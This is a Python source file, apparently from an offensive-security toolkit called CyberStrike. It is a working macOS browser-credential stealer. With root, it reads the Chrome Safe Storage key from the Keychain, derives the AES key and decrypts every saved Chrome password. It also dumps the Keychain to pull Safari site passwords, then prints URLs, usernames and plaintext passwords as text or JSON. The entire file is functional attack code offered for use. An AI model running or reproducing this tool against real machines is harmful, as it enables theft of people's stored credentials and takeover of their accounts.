#!/usr/bin/env python3
"""
chrome_creds.py — Extract Chrome and Safari saved passwords on macOS.

Copies Chrome's Login Data SQLite database, retrieves the Safe Storage
encryption key from Keychain, derives the AES decryption key via PBKDF2,
and decrypts stored passwords. Safari passwords are read via Keychain.

Requires: root privileges for Keychain access without prompts.

Part of CyberStrike offensive security platform.
"""

import argparse
import hashlib
import json
import os
import shutil
import signal
import sqlite3
import subprocess
import sys
import tempfile
import time
from datetime import datetime


class ChromeCredExtractor:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.temp_files = []

    def check_root(self):
        if os.geteuid() != 0:
            print("ERROR: chrome_creds requires root privileges. Run with sudo.", file=sys.stderr)
            sys.exit(1)

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — Browser Credential Extractor (macOS)")
        print("=" * 60)
        print(f"PID:      {os.getpid()}")
        print(f"Browser:  {self.args.browser}")
        print(f"Output:   {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:  {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            pwd_display = record.get("password", "N/A") or "N/A"
            print(f"[{record['browser']:<8}] {record['url']:<50} "
                  f"user={record['username']:<25} pass={pwd_display}", flush=True)

    def get_chrome_safe_storage_key(self):
        """Get Chrome Safe Storage key from Keychain."""
        for label in ["Chrome Safe Storage", "Chrome", "Chromium Safe Storage"]:
            try:
                result = subprocess.run(
                    ["security", "find-generic-password", "-wa", label],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 and result.stdout.strip():
                    return result.stdout.strip()
            except (subprocess.TimeoutExpired, Exception):
                continue
        return None

    def derive_key(self, safe_storage_key):
        """Derive AES-128-CBC key from Safe Storage key using PBKDF2."""
        return hashlib.pbkdf2_hmac(
            "sha1",
            safe_storage_key.encode("utf-8"),
            b"saltysalt",
            1003,
            dklen=16,
        )

    def decrypt_password(self, encrypted_value, key):
        """Decrypt a Chrome password blob."""
        if not encrypted_value or len(encrypted_value) <= 3:
            return None

        if encrypted_value[:3] == b"v10":
            encrypted_value = encrypted_value[3:]
        elif encrypted_value[:3] == b"v11":
            encrypted_value = encrypted_value[3:]

        try:
            try:
                from Crypto.Cipher import AES
                cipher = AES.new(key, AES.MODE_CBC, iv=b" " * 16)
            except ImportError:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                cipher_obj = Cipher(algorithms.AES(key), modes.CBC(b" " * 16))
                decryptor = cipher_obj.decryptor()
                decrypted = decryptor.update(encrypted_value) + decryptor.finalize()
                padding_len = decrypted[-1] if decrypted else 0
                if 0 < padding_len <= 16:
                    decrypted = decrypted[:-padding_len]
                return decrypted.decode("utf-8", errors="replace")

            decrypted = cipher.decrypt(encrypted_value)
            padding_len = decrypted[-1] if decrypted else 0
            if 0 < padding_len <= 16:
                decrypted = decrypted[:-padding_len]
            return decrypted.decode("utf-8", errors="replace")
        except Exception:
            return None

    def extract_chrome(self, profile_name="Default"):
        """Extract credentials from Chrome."""
        login_data_path = os.path.expanduser(
            f"~/Library/Application Support/Google/Chrome/{profile_name}/Login Data"
        )
        if not os.path.exists(login_data_path):
            if not self.args.json_output:
                print(f"[*] Chrome Login Data not found at {login_data_path}", flush=True)
            return

        safe_key = self.get_chrome_safe_storage_key()
        if not safe_key:
            if not self.args.json_output:
                print("[!] Could not retrieve Chrome Safe Storage key from Keychain", flush=True)
            return

        aes_key = self.derive_key(safe_key)

        temp_db = tempfile.mktemp(suffix=".db")
        self.temp_files.append(temp_db)
        shutil.copy2(login_data_path, temp_db)

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                if not self.running:
                    break
                url, username, encrypted_pw = row
                if not username:
                    continue
                password = self.decrypt_password(encrypted_pw, aes_key)
                self.emit({
                    "timestamp": datetime.now().isoformat(),
                    "browser": "chrome",
                    "url": url or "",
                    "username": username or "",
                    "password": password or "",
                    "profile": profile_name,
                })
            conn.close()
        except Exception as e:
            if not self.args.json_output:
                print(f"[!] Error reading Chrome DB: {e}", flush=True)

    def extract_safari(self):
        """Extract Safari passwords via Keychain."""
        try:
            result = subprocess.run(
                ["security", "dump-keychain"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode != 0:
                return

            import re
            entries = []
            current = {}
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("keychain:"):
                    if current.get("server"):
                        entries.append(current)
                    current = {}
                elif '"srvr"<blob>' in line:
                    match = re.search(r'<blob>="(.*?)"', line)
                    if match:
                        current["server"] = match.group(1)
                elif '"acct"<blob>' in line:
                    match = re.search(r'<blob>="(.*?)"', line)
                    if match:
                        current["account"] = match.group(1)
            if current.get("server"):
                entries.append(current)

            for entry in entries:
                if not self.running:
                    break
                server = entry.get("server", "")
                account = entry.get("account", "")
                if not account:
                    continue
                try:
                    pw_result = subprocess.run(
                        ["security", "find-internet-password", "-ga", account, "-s", server, "-w"],
                        capture_output=True, text=True, timeout=5
                    )
                    password = pw_result.stdout.strip() if pw_result.returncode == 0 else None
                except Exception:
                    password = None

                self.emit({
                    "timestamp": datetime.now().isoformat(),
                    "browser": "safari",
                    "url": f"https://{server}" if server else "",
                    "username": account,
                    "password": password or "",
                    "profile": "default",
                })
        except Exception as e:
            if not self.args.json_output:
                print(f"[!] Error extracting Safari creds: {e}", flush=True)

    def run(self):
        self.check_root()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        browser = self.args.browser
        if browser in ("chrome", "all"):
            self.extract_chrome()
            for profile_dir in ["Profile 1", "Profile 2", "Profile 3"]:
                if self.running:
                    self.extract_chrome(profile_dir)

        if browser in ("safari", "all") and self.running:
            self.extract_safari()

        self.cleanup()

    def cleanup(self):
        for temp_file in self.temp_files:
            try:
                os.unlink(temp_file)
            except OSError:
                pass
        print(f"\n--- chrome_creds summary ---")
        print(f"Credentials found: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Temp files cleaned. Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract Chrome/Safari saved passwords on macOS.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 chrome_creds.py\n"
            "  sudo python3 chrome_creds.py --browser chrome --json-output\n"
            "  sudo python3 chrome_creds.py --browser all --json-output | jq '.'\n"
        ),
    )
    parser.add_argument("--browser", choices=["chrome", "safari", "all"], default="all", help="Browser to extract")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    extractor = ChromeCredExtractor(args)
    extractor.run()


if __name__ == "__main__":
    main()
